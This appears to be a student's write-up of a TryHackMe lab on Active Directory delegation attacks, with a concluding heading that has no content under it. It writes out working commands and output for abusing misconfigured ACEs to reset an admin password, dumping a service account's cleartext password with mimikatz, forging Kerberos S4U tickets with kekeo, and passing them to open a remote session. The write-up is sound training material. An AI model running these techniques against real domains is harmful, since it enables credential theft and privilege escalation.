```sh
resolvectl dns exploitad 10.200.60.101 #interface and DNS IP
```
## Exploiting Permission Delegation

### Permission Delegation
ACL-based attacks
Access Control Entities (ACEs)
Discretionary Access Control Lists (DACLs)

E.g. if IT Support has ForceChangePassword ACE over Domain Users, they can escalate privs by resetting privileged account passes

### Exploiting ACEs
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

Notable ACEs

| Name                | Ability                                                                                                                                   |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| ForceChangePassword | Set user's password without knowing current                                                                                               |
| AddMembers          | Add users (including current acct) groups or computers to target group                                                                    |
| GenericAll          | Complete control over object, including ability to change user password, register SPN or add an AD obj to the target group                |
| GenericWrite        | Update any non-protected params of target obj. Could for example update scriptPath param, causing a script to exec next time user logs on |
| WriteOwner          | Update owner of target obj. Could make ourselves owner, gaining addt'l perms over obj                                                     |
| WriteDACL           | Write new ACEs to target obj. Could write DACL that allows our account full control over target obj                                       |
| AllExtendedRights   | Any action associated with extended AD rights against target object. Includes ability to force change user's password                     |
To exploit ACE's, need to interact with AD to make the requests. AD-RSAT powershell or PowerSploit

```
scp za\\amy.king@thmwrk1.za.tryhackme.loc:C:/Users/amy.king/Desktop/20241230170411_BloodHound.zip ./ 

└─$ scp ./SharpHound.exe za\\amy.king@thmwrk1.za.tryhackme.loc:C:\\Users\\amy.king\\Desktop

```

Add "Tier 2 Admins" group as end node, then set starting node as "Domain Users" which our user is a member of

Misconfigured, Domain users have ForceChangePassword ability over IT support group

![BloodHound Permission Delegation](img/blog/bloodhound-perm-deleg.png)

"GenericWrite"
"Bloodhound shows us a very interesting path. It seems that there was a slight bit of Permission Delegation in this domain. An administrator has misconfigured the Permission Delegation of the IT Support group by providing the Domain Users group with the AddMembers ACE. This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members. This is not really a misconfiguration since Tier 2 admins are not that sensitive, but it provides a very potent attack path when combined with the initial misconfiguration."

```powershell
PS C:\>Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"

PS C:\>get-adgroupmember -Identity "Tier 2 Admins" 

PS C:\Users\amy.king> $password = convertto-securestring "P@55w0rd" -asplaintext -force
PS C:\Users\amy.king> set-adaccountpassword -identity "t2_alan.riley" -reset -newpassword $password

PS C:\Users\amy.king> ssh localhost -l t2_alan.riley
```

## Exploiting Kerberos Delegation

This is what you think of when you think AD Delegation
Enable application to access resources hosted on another server.

#### Unconstrained
OG implementation of Kerberos Delegation, least secure method.
https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976
Allows for delegation of all services
#### Constrained Delegation - 2003+
Restricts what services an account can be delegated to, limiting exposure if acct compromised

Ex.
HTTP - Web applications to allow pass-thru auth using AD creds
CIFS - Common Internet FS used for file sharing that allows delegation of users to shares
LDAP - Delegate to LDAP service for actions like resetting user pass
HOST - Delegation of account for all activities on the host
MSSQL - Allows delegation of user accounts to SQL service for pass-thru auth to db's

Exploitation example: Password or NTLM hash, generate TGT for this acct, use TGT to execute TGS req for any non-sensitive user to access service as that user.

#### Resource-Based Constrained Delegation - 2012+
RBCD now specifies objects can delegate to object, allows service owner to control who can access it. Ex. instead of specifying web service account can delegate to db service to access db, can now specify on the db service that the web svc account is allowed to delegate access to it.

Permission to config RBCD for a service - Ability to set msDS-AllowedToActOnBehalfOfOtherIdentity attrib for the AD object. Can populate the attrib with details of an AD account we have access to. Can now generate a TGT for account that we control, which will allow us to interact with this service
https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/

#### Constrained Delegation Exploitation

Enum available delegations, use privileged user

```powershell
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth

userprincipalname        : svcIIS@za.tryhackme.loc                                 

sds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1,
                           http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} 
```

Powershell remoting uses HTTP and WSMAN services as well. Ideally would like to impersonate Tier 1 Admin since this would provide us admin over THMSERVER1

```powershell
C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

# impersonate the SYSTEM user
# make sure to exit out of mimi after this or the tickets will be loaded in wrong context further on
mimikatz # token::elevate
# Interacts with registry hive to pull cleartext creds
mimikatz # lsadump::secrets                                                        

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc  
cur/text: Password1@
```

```powershell
# using kekeo to generate the tickets
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@ 

# /user: user who has constrained delegation perms
# /domain: domain that we are attacking
# /password: password associated with vuln user

Realm        : za.tryhackme.loc (za) 
User         : svcIIS (svcIIS)
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)] 
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto) 
[kdc] addr: 10.200.60.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc 

# Provide the TGT that we generated in previous step
# User to impersonate. Chosing an account that has access over servers, so chose a T1 account
# Services: Services we want to impersonate using delegation. Generate TGS for HTTP then rerun same command for WSMAN service, need both to create pssession
[...]
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi' 
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

```powershell
mimikatz # privilege::debug 

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK


PS C:\Tools\mimikatz_trunk\x64> new-pssession -computername thmserver1.za.tryhackme.loc        

  1 WinRM1   thmserver1.z... RemoteMachine   Opened    Microsoft.PowerShell

PS C:\Tools\mimikatz_trunk\x64> enter-pssession -computername thmserver1.za.tryhackme.loc      
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents>

```

## Exploiting Automated Relays